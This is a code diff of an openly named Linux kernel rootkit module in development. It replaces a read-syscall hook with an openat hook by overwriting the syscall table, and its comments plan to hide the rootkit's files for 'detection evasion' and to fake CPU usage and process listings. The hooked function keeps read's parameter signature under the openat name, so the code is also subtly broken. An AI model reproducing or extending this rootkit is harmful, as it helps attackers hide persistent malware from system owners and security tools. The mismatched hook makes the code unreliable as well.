@@ -1,14 +1,14 @@
-#include "rootkit-main.h"
+#include "rootkit-main.h" //contains most of the memes
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("LS");
 MODULE_DESCRIPTION("RTKT");
 MODULE_VERSION("0.01");
 
-//Test fakeread
-static asmlinkage long fakeRead(int fd, char __user *buf, size_t count) {
+//Test fakeRead
+static asmlinkage long fakeOpenat(int fd, char __user *buf, size_t count) {
 	printk("we have succesfully intecepted a read!\n");
-	return orig_read(fd, buf, count);
+	return orig_Openat(fd, buf, count);
 	}
 
 static struct file_operations file_ops
@@ -43,6 +43,7 @@ static void __exit rootkit_remove(void)
 	if(USE_COUNT == 0) {
 		printk(KERN_INFO "Module successfully removed");
 		unregister_chrdev(major_number, DEVICE_NAME); //this func no longer has a ret val
+		return;
 	}
 	printk(KERN_INFO "Module is still in use by %d processes", USE_COUNT);
 }
@@ -174,9 +175,9 @@ static ssize_t device_write(struct file *filp,
 			unsigned long *syscall_table; 
 			printk("Hooking into sys_calls for general detection evasion\n");
 			/*
-			 1. re-write ls binary
-			 2. do not showup in lsmod
-			 3. hide dev file
+			 1. Hook into openat
+			 2. Check path
+			 3. Hide rtkt file if necessary 
 			 */
 			
 			//Syscall modification test
@@ -187,8 +188,8 @@ static ssize_t device_write(struct file *filp,
 			}
 
 			//save old read
-			orig_read = (typeof(sys_read) *)syscall_table[__NR_read];
-			CRO_WRITE_UNLOCK({ syscall_table[__NR_read] = (void *)&fakeRead; });
+			orig_Openat = (typeof(sys_read) *)syscall_table[__NR_openat];
+			CRO_WRITE_UNLOCK({ syscall_table[__NR_openat] = (void *)&fakeOpenat; });
 			break;
 			}
 		case 4: //Fake CPU usage and programs running 
